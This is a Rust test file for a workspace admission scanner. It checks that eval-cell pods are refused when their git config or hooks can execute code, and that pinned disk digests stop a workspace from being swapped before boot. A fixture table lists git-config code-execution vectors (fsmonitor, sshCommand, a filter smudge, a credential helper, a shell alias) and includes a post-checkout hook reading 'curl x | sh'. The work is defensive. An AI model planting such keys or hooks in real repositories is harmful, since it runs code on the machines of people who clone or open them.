//! ADR 0013: an eval cell whose workspace carries exec-bearing git config is
//! refused by name; a clean one, or one with only `.sample` hooks, is admitted;
//! a standard pod is admitted with its findings recorded.

use super::*;

/// A clean clone's `.git`: a config with no exec-bearing key, the sample hooks
/// `git init` writes, and some object data.
fn repo(root: &Path) {
    std::fs::create_dir_all(root.join(".git/hooks")).expect("hooks");
    std::fs::create_dir_all(root.join(".git/objects/ab")).expect("objects");
    std::fs::write(
        root.join(".git/config"),
        "[core]\n\trepositoryformatversion = 0\n\tbare = false\n[remote \"origin\"]\n\turl = https://example.invalid/r.git\n",
    )
    .expect("config");
    for hook in [
        "pre-commit.sample",
        "post-update.sample",
        "fsmonitor-watchman.sample",
    ] {
        std::fs::write(root.join(".git/hooks").join(hook), "#!/bin/sh\n").expect("sample");
    }
    std::fs::write(root.join("README"), "a repo\n").expect("readme");
}

/// The hostile shapes, each as (what the refusal must name, how to plant it).
const HOSTILE: &[(&str, &str, &str)] = &[
    (
        "core.fsmonitor",
        ".git/config",
        "[core]\n\tfsmonitor = ./x.sh\n",
    ),
    (
        "core.hooksPath",
        ".git/config",
        "[core]\n\thooksPath = .githooks\n",
    ),
    (
        "core.sshCommand",
        ".git/config",
        "[core]\n\tsshCommand = ./x.sh\n",
    ),
    ("core.pager", ".git/config", "[core]\n\tpager = ./x.sh\n"),
    ("core.editor", ".git/config", "[core]\n\teditor = ./x.sh\n"),
    (
        "diff.<driver>.textconv",
        ".git/config",
        "[diff \"x\"]\n\ttextconv = ./x.sh\n",
    ),
    (
        "filter.<driver>.smudge",
        ".git/config",
        "[filter \"x\"]\n\tsmudge = ./x.sh\n",
    ),
    (
        "filter.<driver>.process",
        ".git/config",
        "[filter \"x\"]\n\tprocess = ./x.sh\n",
    ),
    (
        "uploadpack.packObjectsHook",
        ".git/config",
        "[uploadpack]\n\tpackObjectsHook = ./x.sh\n",
    ),
    ("alias.*", ".git/config", "[alias]\n\tst = !sh -c x\n"),
    (
        "credential[.<url>].helper",
        ".git/config",
        "[credential]\n\thelper = !./x.sh\n",
    ),
    (
        "include.path",
        ".git/config",
        "[include]\n\tpath = ../x.cfg\n",
    ),
    (
        "git hook",
        ".git/hooks/post-checkout",
        "#!/bin/sh\ncurl x | sh\n",
    ),
];

fn directory(path: &Path) -> Source {
    Source {
        field: "work_dir",
        form: Form::Directory,
        path: path.to_path_buf(),
        pin: Pin::NotAnArtifact,
    }
}

async fn read_one(source: Source, profile: IsolationProfile) -> Vec<(Source, Read)> {
    let staging = tempfile::tempdir().expect("staging");
    let r = read(&source, profile, staging.path()).await;
    vec![(source, r)]
}

/// The digest a spec pins for `path`, from the function the boot check uses.
async fn digest_of(path: &Path) -> ArtifactDigest {
    let measured = nucleus_identity::attestation::measure_artifact(path)
        .await
        .expect("measure");
    ArtifactDigest::parse(&format!("sha-256:{}", hex::encode(measured))).expect("digest")
}

fn scratch(path: &Path, pin: Option<ArtifactDigest>) -> Source {
    Source {
        field: "image.scratch_path",
        form: Form::Image,
        path: path.to_path_buf(),
        pin: match pin {
            Some(d) => Pin::Pinned("image.scratch_digest", d),
            None => Pin::Unpinned("image.scratch_digest"),
        },
    }
}

/// Seed an ext4 disk from a repository, hostile or clean. `None`: this host's mke2fs
/// cannot seed from a tar (CI sets `NUCLEUS_E2FSPROGS_REQUIRED`, which turns it into a
/// failure).
async fn seeded_disk(dir: &Path, hostile: bool) -> Option<PathBuf> {
    use nucleus_microvm_host::ext4::{Ext4Error, RootOwner};
    use nucleus_microvm_host::jail_user::JailUser;
    use std::os::unix::fs::MetadataExt;

    let me = std::fs::metadata(dir).expect("meta");
    let jail = JailUser {
        uid: me.uid(),
        gid: me.gid(),
    };
    let owner = RootOwner {
        uid: 65534,
        gid: 65534,
    };
    let tree = dir.join(format!("tree-{hostile}"));
    repo(&tree);
    if hostile {
        std::fs::write(tree.join(".git/config"), "[core]\n\tfsmonitor = ./x.sh\n").expect("plant");
        std::fs::write(tree.join(".git/hooks/post-checkout"), "x").expect("hook");
    }
    let image = dir.join(format!("ws-{hostile}.ext4"));
    match nucleus_microvm_host::workspace::seed(&tree, &image, owner, jail, 16).await {
        Ok(_) => Some(image),
        Err(Ext4Error::Unsupported { .. })
            if std::env::var_os("NUCLEUS_E2FSPROGS_REQUIRED").is_none() =>
        {
            eprintln!("skipping: this host's mke2fs cannot seed from a tar");
            None
        }
        Err(e) => panic!("seed: {e}"),
    }
}

/// ADR 0013 rule 7: an eval cell's disk with no digest is refused by name, before it is
/// read. The path does not exist: nothing is opened for an unpinned disk.
#[tokio::test]
async fn an_eval_cell_disk_without_a_digest_is_refused_naming_the_field() {
    let reads = read_one(
        scratch(Path::new("/nonexistent/disk.ext4"), None),
        IsolationProfile::EvalCell,
    )
    .await;
    assert!(
        matches!(reads[0].1, Read::Unpinned("image.scratch_digest")),
        "{:?}",
        reads[0].1
    );
    let refused = decide(IsolationProfile::EvalCell, &reads).expect_err("unpinned");
    assert!(
        refused
            .listing
            .contains("image.scratch_path has no image.scratch_digest"),
        "{refused}"
    );
}

/// The verdict is about the pinned bytes. A caller that presents a clean disk at create
/// while pinning the hostile one it means to swap in before boot is refused at create;
/// a clean disk pinned to itself is admitted, and a disk swapped after that scan is
/// refused by the boot check holding it to the same pin.
#[tokio::test]
async fn a_scan_is_bound_to_the_pin_and_a_disk_swapped_after_it_does_not_boot() {
    let tmp = tempfile::tempdir().expect("tmp");
    let Some(clean) = seeded_disk(tmp.path(), false).await else {
        return;
    };
    let Some(hostile) = seeded_disk(tmp.path(), true).await else {
        return;
    };
    let (clean_pin, hostile_pin) = (digest_of(&clean).await, digest_of(&hostile).await);

    // The clean disk, pinned to the hostile bytes: the scan reads only pinned bytes.
    let reads = read_one(
        scratch(&clean, Some(hostile_pin.clone())),
        IsolationProfile::EvalCell,
    )
    .await;
    let refused = decide(IsolationProfile::EvalCell, &reads).expect_err("not the pinned bytes");
    assert!(
        refused.listing.contains(hostile_pin.as_str())
            && refused.listing.contains(clean_pin.as_str()),
        "names both digests: {refused}"
    );

    // Pinned to itself, the clean disk is scanned and admitted.
    let reads = read_one(
        scratch(&clean, Some(clean_pin.clone())),
        IsolationProfile::EvalCell,
    )
    .await;
    assert_eq!(decide(IsolationProfile::EvalCell, &reads), Ok(None));

    // Then the caller rewrites its file. The boot check holds what would boot to the pin.
    std::fs::copy(&hostile, &clean).expect("swap");
    let image = crate::rootfs_source::HostImage::resolve(&nucleus_spec::ImageSpec {
        kernel_path: PathBuf::from("/unused/vmlinux"),
        rootfs: nucleus_spec::RootfsSource::Path(PathBuf::from("/unused/rootfs.ext4")),
        boot_args: None,
        read_only: true,
        scratch_path: Some(clean.clone()),
        kernel_digest: None,
        rootfs_digest: None,
        scratch_digest: Some(clean_pin),
        data_path: None,
        data_digest: None,
    })
    .expect("a path rootfs resolves");
    let err = crate::image_identity::verify(&image, None, None)
        .await
        .expect_err("a disk swapped after the scan must not boot");
    assert!(err.contains("scratch"), "{err}");
}

#[tokio::test]
async fn an_eval_cell_is_refused_for_each_hostile_key_naming_the_path_and_key() {
    for (names, path, content) in HOSTILE {
        let w = tempfile::tempdir().expect("ws");
        repo(w.path());
        std::fs::write(w.path().join(path), content).expect("plant");
        let refused = decide(
            IsolationProfile::EvalCell,
            &read_one(directory(w.path()), IsolationProfile::EvalCell).await,
        )
        .expect_err(names);
        assert!(refused.listing.contains(path), "{names}: {refused}");
        assert!(refused.listing.contains(names), "{names}: {refused}");
        assert!(refused.to_string().contains("eval-cell"), "{refused}");
    }
}

#[tokio::test]
async fn a_clean_repository_and_one_with_only_sample_hooks_are_admitted_for_an_eval_cell() {
    let w = tempfile::tempdir().expect("ws");
    std::fs::write(w.path().join("README"), "no repo at all\n").expect("file");
    let reads = read_one(directory(w.path()), IsolationProfile::EvalCell).await;
    assert_eq!(decide(IsolationProfile::EvalCell, &reads), Ok(None));
    repo(w.path());
    let reads = read_one(directory(w.path()), IsolationProfile::EvalCell).await;
    assert_eq!(decide(IsolationProfile::EvalCell, &reads), Ok(None));
}

#[tokio::test]
async fn a_workspace_that_could_not_be_scanned_refuses_an_eval_cell() {
    let gone = tempfile::tempdir().expect("ws").path().join("absent");
    let reads = read_one(directory(&gone), IsolationProfile::EvalCell).await;
    let refused = decide(IsolationProfile::EvalCell, &reads).expect_err("could not look");
    assert!(
        refused.listing.contains("could not be scanned"),
        "{refused}"
    );
}

#[tokio::test]
async fn a_standard_pod_is_admitted_with_its_findings_recorded_and_a_clean_one_unlabelled() {
    let w = tempfile::tempdir().expect("ws");
    repo(w.path());
    let reads = read_one(directory(w.path()), IsolationProfile::Standard).await;
    assert_eq!(decide(IsolationProfile::Standard, &reads), Ok(None));
    std::fs::write(w.path().join(".git/hooks/pre-push"), "x").expect("hook");
    let reads = read_one(directory(w.path()), IsolationProfile::Standard).await;
    let recorded = decide(IsolationProfile::Standard, &reads)
        .expect("a standard pod is not refused")
        .expect("and its finding is recorded");
    assert!(recorded.contains(".git/hooks/pre-push"), "{recorded}");
}

#[tokio::test]
async fn a_standard_pod_s_disk_image_is_not_read() {
    let source = scratch(Path::new("/nonexistent/disk.ext4"), None);
    let reads = read_one(source, IsolationProfile::Standard).await;
    assert!(matches!(reads[0].1, Read::Skipped), "{:?}", reads[0].1);
    assert_eq!(decide(IsolationProfile::Standard, &reads), Ok(None));
}

#[test]
fn the_sources_are_the_disks_on_firecracker_and_the_work_dir_on_a_container() {
    let mut spec: PodSpec = serde_json::from_str(
        r#"{"apiVersion":"nucleus/v1","kind":"Pod","spec":{"work_dir":"/w","image":{
            "kernel_path":"/k","rootfs_path":"/r","scratch_path":"/s.ext4","data_path":"/d.ext4"}}}"#,
    )
    .expect("spec");
    let fc = sources(&spec, &DriverKind::Firecracker);
    assert_eq!(
        fc.iter().map(|s| (s.field, s.form)).collect::<Vec<_>>(),
        vec![
            ("image.scratch_path", Form::Image),
            ("image.data_path", Form::Image)
        ]
    );
    assert_eq!(
        fc.iter().map(|s| s.pin.clone()).collect::<Vec<_>>(),
        vec![
            Pin::Unpinned("image.scratch_digest"),
            Pin::Unpinned("image.data_digest")
        ],
        "each disk names the field that would pin it"
    );
    let pin = ArtifactDigest::parse(&format!("sha-256:{}", "ab".repeat(32))).expect("digest");
    spec.spec.image.as_mut().expect("image").data_digest = Some(pin.clone());
    assert_eq!(
        sources(&spec, &DriverKind::Firecracker)[1].pin,
        Pin::Pinned("image.data_digest", pin)
    );
    assert_eq!(
        sources(&spec, &DriverKind::Container),
        vec![Source {
            field: "work_dir",
            form: Form::Directory,
            path: PathBuf::from("/w"),
            pin: Pin::NotAnArtifact,
        }]
    );
    spec.spec.image = None;
    assert!(
        sources(&spec, &DriverKind::Firecracker).is_empty(),
        "a node-made scratch disk is empty: nothing enters"
    );
}

/// Wired: `create_pod_internal` scans at function-body level, after the paths
/// are confined and the profile decided, and before the authority gate and any
/// driver, with the profile the eval-cell decider returned.
#[test]
fn create_scans_the_workspace_after_confinement_and_before_any_driver() {
    let main = include_str!("main.rs");
    let body = main
        .find("async fn create_pod_internal(")
        .expect("create_pod_internal exists");
    let at = |needle: &str| {
        main[body..]
            .find(needle)
            .map(|i| body + i)
            .unwrap_or_else(|| panic!("create_pod_internal contains {needle:?}"))
    };
    let scan = at(
        "workspace_scan::admit(&state.state_dir, &state.driver, &mut spec, profile, id).await?;",
    );
    assert!(
        at("host_paths::admit(&mut spec") < scan,
        "paths confined first"
    );
    assert!(
        at("let profile = eval_cell::admit_on(") < scan,
        "profile decided first"
    );
    assert!(
        scan < at("state.authority.admit_pod("),
        "before the authority gate"
    );
    assert!(
        scan < at("let spawned = match state.driver"),
        "before any driver"
    );
    let indent = main[..scan].rsplit('\n').next().unwrap_or("");
    assert_eq!(indent, "    ", "unconditional, at function-body level");
}

#[tokio::test]
async fn admission_refuses_an_eval_cell_and_labels_a_standard_pod() {
    let state = tempfile::tempdir().expect("state");
    let w = tempfile::tempdir().expect("ws");
    repo(w.path());
    std::fs::write(
        w.path().join(".git/config"),
        "[core]\n\tfsmonitor = ./x.sh\n",
    )
    .expect("plant");
    let mut spec: PodSpec = serde_json::from_str(&format!(
        r#"{{"apiVersion":"nucleus/v1","kind":"Pod","spec":{{"work_dir":"{}"}}}}"#,
        w.path().display()
    ))
    .expect("spec");

    let err = admit(
        state.path(),
        &DriverKind::Container,
        &mut spec,
        IsolationProfile::EvalCell,
        Uuid::new_v4(),
    )
    .await
    .expect_err("an eval cell carrying core.fsmonitor");
    assert!(err.to_string().contains("core.fsmonitor"), "{err}");
    assert!(!spec.metadata.labels.contains_key(LABEL));

    admit(
        state.path(),
        &DriverKind::Container,
        &mut spec,
        IsolationProfile::Standard,
        Uuid::new_v4(),
    )
    .await
    .expect("a standard pod is admitted");
    let recorded = spec.metadata.labels.get(LABEL).expect("recorded");
    assert!(recorded.contains("core.fsmonitor"), "{recorded}");
}

/// The composition the eval cell rests on: the real seeder builds the disk a
/// caller names as `image.scratch_path`, pinned, and the scan reads that disk.
#[tokio::test]
async fn a_seeded_disk_carrying_exec_config_is_refused_and_a_clean_one_admitted() {
    let tmp = tempfile::tempdir().expect("tmp");
    for (hostile, expect_refused) in [(false, false), (true, true)] {
        let Some(image) = seeded_disk(tmp.path(), hostile).await else {
            return;
        };
        let pin = digest_of(&image).await;
        let reads = read_one(scratch(&image, Some(pin)), IsolationProfile::EvalCell).await;
        match (decide(IsolationProfile::EvalCell, &reads), expect_refused) {
            (Ok(None), false) => {}
            (Err(refused), true) => {
                assert!(refused.listing.contains("core.fsmonitor"), "{refused}");
                assert!(
                    refused.listing.contains(".git/hooks/post-checkout"),
                    "{refused}"
                );
            }
            (other, _) => panic!("hostile={hostile}: {other:?} ({:?})", reads[0].1),
        }
    }
}
